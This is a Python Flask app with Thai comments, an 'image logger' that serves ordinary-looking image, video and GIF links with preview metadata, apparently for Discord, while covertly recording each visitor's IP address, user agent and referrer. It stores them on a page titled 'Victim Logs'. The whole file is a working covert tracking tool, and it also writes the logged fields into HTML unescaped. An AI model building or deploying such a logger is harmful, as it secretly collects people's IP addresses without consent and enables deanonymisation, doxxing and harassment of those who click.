from flask import Flask, request, redirect, Response
import requests
import json
import datetime
import os

app = Flask(__name__)

# เก็บ log ใน memory
logs = []

def log_victim(ip, user_agent, referrer, log_type):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    logs.append({
        'ip': ip,
        'user_agent': user_agent,
        'referrer': referrer,
        'timestamp': timestamp,
        'type': log_type
    })
    # เก็บแค่ 100 ล่าสุด
    if len(logs) > 100:
        logs.pop(0)

@app.route('/')
def home():
    return '''
    <html>
    <head>
        <title>Image Logger</title>
        <style>
            body { background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px; }
            .container { max-width: 800px; margin: 0 auto; }
            .menu { display: grid; gap: 10px; margin: 20px 0; }
            .menu-item { background: #1a1a1a; padding: 15px; border: 1px solid #00ff00; text-align: center; }
            .logs { background: #1a1a1a; padding: 15px; border: 1px solid #00ff00; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🕵️ Image Logger</h1>
            <div class="menu">
                <div class="menu-item" onclick="location.href='/image'">📷 Image Logger</div>
                <div class="menu-item" onclick="location.href='/video'">🎥 Video Logger</div>
                <div class="menu-item" onclick="location.href='/gif'">🎞️ GIF Logger</div>
                <div class="menu-item" onclick="location.href='/logs'">📊 View Logs</div>
            </div>
            <div class="logs">
                <h3>Recent Activity</h3>
                ''' + ''.join([f'<div>[{log["timestamp"]}] {log["ip"]} - {log["type"]}</div>' for log in logs[-10:]]) + '''
            </div>
        </div>
    </body>
    </html>
    '''

@app.route('/image')
def image_logger():
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'Direct')
    
    log_victim(victim_ip, user_agent, referrer, 'IMAGE')
    
    # ส่งรูปภาพจริงที่แสดงใน Discord ได้เลย
    image_url = "https://images.unsplash.com/photo-1579546929662-711aa81148cf?w=500&q=80"
    
    try:
        response = requests.get(image_url, stream=True)
        return Response(
            response.iter_content(chunk_size=8192),
            content_type=response.headers['Content-Type'],
            headers={
                'Content-Length': response.headers.get('Content-Length'),
                'Cache-Control': 'no-cache'
            }
        )
    except:
        return redirect(image_url)

@app.route('/video')
def video_logger():
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'Direct')
    
    log_victim(victim_ip, user_agent, referrer, 'VIDEO')
    
    video_url = "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4"
    
    return f'''
    <html>
    <head>
        <meta property="og:title" content="Awesome Video">
        <meta property="og:description" content="Watch this amazing video!">
        <meta property="og:video" content="{video_url}">
        <meta property="og:video:type" content="video/mp4">
    </head>
    <body>
        <video controls width="600">
            <source src="{video_url}" type="video/mp4">
        </video>
    </body>
    </html>
    '''

@app.route('/gif')
def gif_logger():
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'Direct')
    
    log_victim(victim_ip, user_agent, referrer, 'GIF')
    
    gif_url = "https://media.giphy.com/media/3o7aCSPqXE5C6T8tBC/giphy.gif"
    
    return f'''
    <html>
    <head>
        <meta property="og:title" content="Funny GIF">
        <meta property="og:description" content="Check this GIF!">
        <meta property="og:image" content="{gif_url}">
    </head>
    <body>
        <img src="{gif_url}" width="500">
    </body>
    </html>
    '''

@app.route('/logs')
def view_logs():
    html = '''
    <html>
    <head><title>Logs</title></head>
    <body style="background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px;">
        <h1>📊 Victim Logs</h1>
        <table border="1" style="border-color: #00ff00;">
            <tr>
                <th>IP</th>
                <th>User Agent</th>
                <th>Time</th>
                <th>Type</th>
            </tr>
    '''
    
    for log in reversed(logs):
        html += f'''
            <tr>
                <td>{log['ip']}</td>
                <td>{log['user_agent'][:50]}...</td>
                <td>{log['timestamp']}</td>
                <td>{log['type']}</td>
            </tr>
        '''
    
    html += '''
        </table>
        <br>
        <a href="/" style="color: #00ff00;">← Back</a>
    </body>
    </html>
    '''
    
    return html

# สำหรับ Vercel
if __name__ == '__main__':
    app.run(debug=True)
